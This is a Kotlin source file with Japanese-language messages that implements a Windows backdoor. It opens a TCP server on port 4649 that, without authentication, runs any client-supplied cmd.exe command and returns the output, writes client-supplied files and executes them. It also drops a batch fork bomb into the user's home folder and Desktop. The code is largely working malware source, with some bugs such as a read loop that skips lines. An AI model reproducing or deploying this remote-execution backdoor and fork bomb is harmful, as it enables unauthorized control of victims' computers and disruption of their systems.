package sbmk.tommy

import java.io.BufferedOutputStream
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.ServerSocket

fun main(args: Array<String>) {
	var isCommandMode = false
	var isCreateFileMode = false
	var createFileOption = 0
	var fileName = ""
	var fileContents = StringBuilder()
	
	val server = ServerSocket(4649, 5)
	while (true) {
		println("サーバー稼働中。")
		
		val socket = server.accept()
		
		println("クライアントに接続しました。")
		
		val input = BufferedReader(InputStreamReader(socket.getInputStream())).readLine()
		val output = PrintWriter(socket.getOutputStream())
		
		if (isCommandMode) {
			val runtime = Runtime.getRuntime()
			val process = runtime.exec("cmd.exe /c $input")
			val inputStream = process.inputStream
			
			val bufferedReader = BufferedReader(InputStreamReader(inputStream))
			val cmdReturn = StringBuilder()
			var lines: String
			while (bufferedReader.readLine() != null) {
				lines = bufferedReader.readLine()
				cmdReturn.append(lines)
			}
			bufferedReader.close()
			
			isCommandMode = false
			
			println("コマンド「${input}」を実行しました。")
			
			output.println("コマンドを実行しました。実行結果は「${cmdReturn}」です。")
			output.flush()
		} else if (isCreateFileMode) {
			when (createFileOption) {
				1 -> {
					fileName = input
					createFileOption++
					
					println("ファイルの名前を受け取りました「$input」")
					
					output.println("ファイルの名前を受け取りました。ファイルの中身を入力し、実行時は/Goと入力してください。")
					output.flush()
				}
				2 -> {
					when (input) {
						"/Go" -> {
							val file = File(fileName)
							val bos = BufferedOutputStream(FileOutputStream(file))
							bos.write(fileContents.toString().toByteArray())
							bos.close()
							Runtime.getRuntime().exec("cmd /c" + file.absolutePath)
							
							fileName = ""
							fileContents = StringBuilder()
							isCreateFileMode = false
							createFileOption = 0
							
							println("ファイルを作成しました。")
							
							output.println("ファイルを作成し、実行しました。実行したい命令を入力してください。")
							output.flush()
						}
						else -> {
							fileContents.append(input).append("\n")
							
							println("ファイルの中身を追加しました。")
							
							output.println("続いてファイルの中身を入力するか、/Goで実行してください")
							output.flush()
						}
					}
				}
			}
		}
		
		when (input) {
			"/Command" -> {
				isCommandMode = true
				output.println("コマンドモード指定を受けました。実行したいコマンドプロンプトのコマンドを入力してください。")
				output.flush()
			}
			
			"/CreateFile" -> {
				createFileOption++
				isCreateFileMode = true
				output.println("ファイル生成モード指定を受けました。ファイルの名前を拡張子込みで入力してください。")
				output.flush()
			}
			
			"/EndServer" -> {
				output.println("サーバーを閉じます。")
				output.flush()
				System.exit(0)
			}
			
			"/CreateTaskKillFile" -> {
				val file = File("taskkill.bat")
				val bos = BufferedOutputStream(file.outputStream())
				bos.write(":loop \n start cmd.exe \n goto loop".toByteArray())
				Runtime.getRuntime().exec("cmd /c copy ${file.absolutePath} C:\\Users\\%username%")
				Runtime.getRuntime().exec("cmd /c copy ${file.absolutePath} C:\\Users\\%username%\\Desktop")
				bos.close()
				output.println("ファイルを生成しました。")
				output.flush()
			}
			
			else -> {
				println("クライアントから送られてきたメッセージは「$input」")
				output.println("クライアントからメッセージ「$input」を受信しました。実行したい命令を入力してください。")
				output.flush()
			}
		}
		output.close()
		socket.close()
	}
}